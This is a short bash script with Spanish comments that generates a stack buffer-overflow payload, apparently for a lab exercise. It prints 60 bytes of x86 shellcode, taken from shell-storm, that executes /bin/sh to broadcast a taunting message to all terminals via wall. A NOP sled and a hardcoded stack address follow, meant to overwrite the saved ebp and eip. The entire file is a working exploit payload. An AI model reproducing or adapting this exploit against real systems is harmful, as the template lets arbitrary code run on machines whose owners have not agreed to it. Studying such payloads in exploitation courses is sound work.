#!/bin/bash
#Envia un mensaje a los terminales
#http://shell-storm.org/shellcode/files/shellcode-604.php
#60 bytes
echo -ne "\x6a\x0b\x58\x99\x52\x68\x77\x61\x6c\x6c\x68\x21\x20\x7c\x20\x68\x63\x6b\x33\x64\x68\x20\x50\x68\x75\x68\x65\x63\x68\x6f\x89\xe6\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80"   

for i in $(seq 61 508)
do
  echo -en "\x90" 
done

#sobreescribir las copias del ebp y eip
for i in 1 2
do
  echo -en "\xac\xd4\xff\xff"
done

